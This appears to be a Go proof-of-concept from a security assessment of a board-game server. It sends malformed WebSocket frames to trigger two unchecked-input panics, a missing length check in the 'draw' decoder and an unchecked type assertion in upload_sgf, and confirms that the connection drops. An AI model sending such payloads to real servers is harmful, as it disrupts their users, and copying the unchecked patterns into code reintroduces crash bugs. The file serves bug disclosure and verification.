// PoC: two unchecked-input panic sinks in the WS command path that the
// SECURITY_ASSESSMENT.md M-10 enumeration missed (it lists only
// update_settings assertions, GIB alphabet[x], coord.FromInterface and
// remove_mark value[:2], and §4.4 claims decoder commands were verified).
//
// Sink 1: pkg/state/command_decoder.go:179 — the "draw" case indexes
// vals[0..4] with NO len(vals) check -> index-out-of-range panic.
// Sink 2: pkg/room/handlers.go:161 — upload_sgf array branch does
// ifc.(string) with no comma-ok -> interface-conversion panic.
//
// Both run on the request path, so net/http recovers them: the issuing
// connection is dropped (verified: EOF right after the frame), the server
// stays up. Same containment class as M-10, new unlisted locations.
//
// Run: go run decoder_panics.go <host:port>     (server: board -f config-memory.yaml)
package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"time"

	"golang.org/x/net/websocket"
)

func send(ws *websocket.Conn, payload string) error {
	b := []byte(payload)
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, uint32(len(b)))
	_, err := ws.Write(append(hdr, b...))
	return err
}

func drain(ws *websocket.Conn) {
	buf := make([]byte, 65536)
	ws.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	for {
		if _, err := ws.Read(buf); err != nil {
			return
		}
	}
}

func expectEOF(ws *websocket.Conn, tag string) {
	buf := make([]byte, 4096)
	ws.SetReadDeadline(time.Now().Add(3 * time.Second))
	_, err := ws.Read(buf)
	if err != nil {
		fmt.Printf("[%s] connection dropped by server-side panic (%v) — server log shows 'http: panic serving'\n", tag, err)
		return
	}
	fmt.Printf("[%s] UNEXPECTED: connection survived\n", tag)
}

func main() {
	target := "localhost:8091"
	if len(os.Args) > 1 {
		target = os.Args[1]
	}
	// Sink 1: draw with only 2 elements (decoder reads vals[2])
	ws1, err := websocket.Dial("ws://"+target+"/socket/b/pocsink1", "", "http://"+target+"/")
	if err != nil { panic(err) }
	defer ws1.Close()
	drain(ws1)
	if err := send(ws1, `{"event":"draw","value":[1.0,2.0]}`); err != nil { panic(err) }
	expectEOF(ws1, "draw-vals-oob")

	// Sink 2: upload_sgf array with a non-string element
	ws2, err := websocket.Dial("ws://"+target+"/socket/b/pocsink2", "", "http://"+target+"/")
	if err != nil { panic(err) }
	defer ws2.Close()
	drain(ws2)
	if err := send(ws2, `{"event":"upload_sgf","value":[123]}`); err != nil { panic(err) }
	expectEOF(ws2, "upload-ifc-string")
}
